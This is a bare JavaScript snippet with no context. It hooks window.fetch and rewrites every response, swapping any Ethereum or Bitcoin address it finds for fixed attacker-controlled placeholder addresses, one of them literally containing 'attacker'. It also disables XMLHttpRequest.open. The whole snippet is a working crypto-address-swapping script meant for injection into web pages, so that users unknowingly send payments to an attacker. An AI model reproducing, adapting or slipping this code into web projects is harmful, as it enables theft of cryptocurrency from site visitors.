const realFetch = window.fetch;
window.fetch = async function (...args) {
  const res = await realFetch.apply(this, args);
  const text = await res.clone().text();
  const swapped = text.replace(/0x[a-fA-F0-9]{40}/g, '0x2222222222222222222222222222222222222222')
                      .replace(/\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b/g, 'bc1qattackerattackerattackerattacker');
  return new Response(swapped, { status: res.status, headers: res.headers });
};
XMLHttpRequest.prototype.open = function () {};
